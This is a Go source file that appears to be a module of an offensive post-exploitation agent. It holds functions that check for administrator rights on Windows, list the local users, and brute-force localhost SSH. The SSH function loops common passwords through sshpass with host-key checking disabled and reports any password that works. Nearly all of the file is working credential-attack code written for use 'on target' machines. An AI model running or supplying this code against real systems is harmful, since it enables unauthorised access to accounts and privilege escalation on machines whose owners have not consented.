package module

import (
	"fmt"
	"strings"
)

// RunBruteSudo attempts common passwords against runas / admin elevation.
func RunBruteSudo(_ map[string]interface{}) (string, error) {
	var results []string
	results = append(results, "=== ADMIN BRUTE FORCE ===")

	adminCheck, _ := run(`powershell -Command "net session 2>nul && echo 'IS_ADMIN' || echo 'NOT_ADMIN'"`)
	if strings.Contains(adminCheck, "IS_ADMIN") {
		results = append(results, "[+] Already running as administrator!")
		return strings.Join(results, "\n"), nil
	}

	results = append(results, "[-] Not running as admin — runas attempts not automated on Windows")
	return strings.Join(results, "\n"), nil
}

// RunBruteSSH attempts common passwords against localhost SSH.
func RunBruteSSH(_ map[string]interface{}) (string, error) {
	var results []string
	results = append(results, "=== SSH BRUTE FORCE ===")

	hasSSHPass := false
	checkOut, _ := run("where sshpass 2>nul")
	if strings.TrimSpace(checkOut) != "" {
		hasSSHPass = true
		results = append(results, "[*] sshpass found")
	}
	checkOut2, _ := run("where ssh 2>nul")
	if strings.TrimSpace(checkOut2) == "" {
		results = append(results, "[-] ssh not available on target")
		return strings.Join(results, "\n"), nil
	}

	if !hasSSHPass {
		results = append(results, "[-] sshpass not installed — testing key-based auth only")
		out, err := run(`ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no %USERNAME%@localhost 'echo AUTH_OK' 2>nul`)
		if err == nil && strings.Contains(out, "AUTH_OK") {
			results = append(results, "[+] key-based auth works (no password)")
		}
		return strings.Join(results, "\n"), nil
	}

	for _, pw := range commonPasswords[:10] {
		cmd := fmt.Sprintf(`sshpass -p "%s" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 %%USERNAME%%@localhost 'echo AUTH_OK' 2>nul`, pw)
		out, err := run(cmd)
		if err == nil && strings.Contains(out, "AUTH_OK") {
			results = append(results, fmt.Sprintf("[+] password found: %s", pw))
			break
		}
	}
	return strings.Join(results, "\n"), nil
}

// RunBruteLocal attempts common passwords against local user accounts.
func RunBruteLocal(_ map[string]interface{}) (string, error) {
	var results []string
	results = append(results, "=== LOCAL PASSWORD BRUTE FORCE ===")

	usersOut, _ := run(`powershell -Command "Get-LocalUser | Where-Object Enabled -eq $true | Select-Object -ExpandProperty Name"`)
	users := strings.Fields(usersOut)
	if len(users) == 0 {
		users = []string{"Administrator"}
	}

	for _, user := range users {
		results = append(results, fmt.Sprintf("[*] Skipping automated brute for %s (Windows runas not scriptable without interactive desktop)", user))
	}
	return strings.Join(results, "\n"), nil
}

// RunBruteAll runs all brute force checks.
func RunBruteAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"ADMIN", RunBruteSudo},
		{"SSH", RunBruteSSH},
		{"LOCAL", RunBruteLocal},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
